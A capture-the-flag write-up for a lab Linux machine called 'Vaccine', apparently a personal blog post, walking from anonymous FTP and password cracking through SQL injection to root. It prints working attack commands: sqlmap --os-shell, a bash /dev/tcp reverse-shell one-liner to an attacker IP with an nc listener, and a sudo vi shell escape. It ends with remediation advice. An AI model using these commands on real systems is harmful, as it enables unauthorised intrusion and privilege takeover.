# Vaccine | Machine | Very Easy | Linux

## Introduction

Pen-testing usually requires chaining multiple attacks together in order to compromise or gain access to a system. Sometimes a machine might not have any evident vulnerabilities, but rather a weak password that will simplify the whole operation.

## Methodology

We start enumerating using `nmap -sC -sV`.

3 ports are open: ftp, ssh, http. SSH isn't an option since we don't have credentials. FTP has anonymous log-ins enabled, so we start there.

After logging in as anonymous, I found `backup.zip` on the FTP server so I downloaded it.

`zip2john` is a tool used to extract a crackable hash from a password-protected zip file:

```
zip2john backup.zip > ziphash
```

This outputs the hash in a format John the Ripper can crack.

John the Ripper is a free password cracking tool. I used it on the hash file with the rockyou.txt wordlist:

```
john --wordlist=<path> hashfile
```

After finding the password, I extracted the zip's contents and found `index.php`, which had a hard-coded password hash inside it.

## Cracking the hash

John takes a word from your provided wordlist & runs it through the same hashing algorithm used by the machine to hash a password. If, after running through the whole wordlist, a word matches the hash it's trying to crack, then that word is the password.

## Getting a shell

I looked up an MD5 reverser online & got the password `qwerty789`. Next, I reused the same credentials to log into the admin dashboard.

At first the dashboard didn't seem to let me execute commands on the OS — nothing special in it except a search bar — but it turns out that search bar executes SQL, and through that SQL execution it's possible to run OS commands directly.

For the foothold, I found that the search parameter on the dashboard is vulnerable to SQL injection, letting me read from and potentially write to the underlying database.

I used sqlmap to automate the process, passing the URL and the session cookie for the vulnerable request, along with the `--os-shell` flag to drop into an OS shell:

```
sqlmap -u <URL> --cookie="your-cookie=..." --os-shell
```

## Shell handling / netcat listener

Where the target machine is the one initiating the connection to our machine (a reverse shell as opposed to a bind shell).

In a separate terminal we start our listener:

```
sudo nc -lvnp 443
```

Then on the target we trigger the reverse shell:

```
bash -c "bash -i >& /dev/tcp/<your-ip>/443 0>&1"
```

We got the shell! However, I quickly noticed that it wasn't really behaving like a normal shell — no `fg`, no autocomplete, and things like `sudo`/`su` didn't seem to be handled correctly.

I used a python3 module trick to spawn a new process wrapped in a pty:

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

`Ctrl+Z` suspends our local shell (NOT the target shell).

```
stty raw -echo
fg
```

`fg` brings back the paused reverse shell to the foreground.

```
export TERM=xterm
```

handles correct rendering & prevents glitching.

After that, I had a much more interactive shell, and after some looking around, I found the user flag! (`/var/lib/postgresql/user.txt`)

---

## Privilege Escalation (completed / researched)

*The notes above stopped after the initial reverse shell and user flag. I looked up how the box's root path continues and finished it below so the write-up is complete.*

Once stabilized, `id` shows we're the `postgres` user. Checking sudo privileges:

```
sudo -l
```

This shows `postgres` can run `/bin/vi` as root without a password:

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

`vi` running with sudo is a classic GTFOBins privilege-escalation vector — it can be used to spawn a shell that inherits root's privileges. From inside `vi`:

```
:!bash
```

or, alternatively:

```
:set shell=/bin/sh
:shell
```

This drops into a `bash` shell running as **root**. From there:

```
whoami        # root
cat /root/root.txt
```

Root flag captured.

### Summary of the full chain
1. Anonymous FTP → downloaded `backup.zip`
2. `zip2john` + `john` (rockyou.txt) → cracked the zip password
3. Extracted zip → found `index.php` with an MD5 password hash
4. Cracked the MD5 hash via an online reverser
5. Logged into the admin dashboard with the recovered credentials
6. Found a SQL injection in the dashboard's search parameter
7. Used `sqlmap --os-shell` to get command execution
8. Caught a reverse shell with `nc`, stabilized it with `python3 -c "import pty;pty.spawn('/bin/bash')"` + `stty raw -echo` + `export TERM=xterm`
9. Captured the user flag as `postgres`
10. `sudo -l` → `postgres` can run `/bin/vi` as root on `pg_hba.conf`
11. GTFOBins vi escape (`:!bash`) → root shell → root flag

### Remediation
- Remove backups/config files with credentials from anonymously-accessible FTP shares.
- Store credentials with a strong, salted hashing algorithm (bcrypt/argon2) instead of raw MD5.
- Sanitize/parameterize all SQL inputs in the dashboard to prevent injection.
- Restrict `sudo` rules — never allow full-featured editors like `vi`/`vim` to run as root via sudo (GTFOBins escape).
